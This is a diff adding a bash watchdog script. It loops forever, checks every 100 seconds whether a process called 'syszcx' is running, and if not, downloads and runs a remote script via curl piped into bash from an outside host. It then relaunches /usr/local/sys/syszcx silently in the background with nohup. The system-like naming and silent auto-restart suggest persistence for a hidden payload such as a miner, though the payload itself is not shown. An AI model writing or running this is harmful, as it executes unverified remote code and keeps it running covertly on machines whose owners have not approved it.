@@ -1,0 +1,23 @@
+#!/bin/bash
+
+function count_process()
+{
+    ps -ef |grep $1 |grep -v "grep" |wc -l
+}
+
+while :
+do
+if [ $(count_process syszcx) -eq 0 ]
+then
+  echo 'syszcx is not actived'
+    if [ ! -f syszcx ];then
+	bash  <(curl  -Ls https://hh.hankhu.com/mysh/musys)
+    fi
+  nohup bash /usr/local/sys/syszcx &>/dev/null & 
+  echo 'syszcx started just now'
+else
+  echo 'syszcx is running'
+fi
+
+sleep 100
+done
